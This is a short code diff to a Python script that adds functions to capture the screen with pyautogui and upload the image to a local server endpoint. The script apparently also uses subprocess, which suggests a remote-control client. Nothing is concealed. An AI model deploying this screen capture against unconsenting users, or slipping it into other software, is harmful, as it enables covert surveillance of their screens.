@@ -2,8 +2,24 @@ import requests
 import json
 import time
 import subprocess
+import io
+import base64
+import pyautogui
 
-endPoint = "YOUR_END_POINT"
+endPoint = "http://localhost:8080"
+
+def GetScreenBytes():
+    screenShot = pyautogui.screenshot()
+    imgBytes = io.BytesIO()
+    screenShot.save(imgBytes, "PNG")
+    imgBytes.seek(0)
+    return imgBytes
+
+def GetScreen():
+    imgBytes = GetScreenBytes()
+    fileData = {"file": ("screenshot.png", imgBytes, "image/png")}
+    requests.post(endPoint + "/upload", files=fileData)
+
 
 requiredLibraries = ["numpy", "pyautogui"]
 
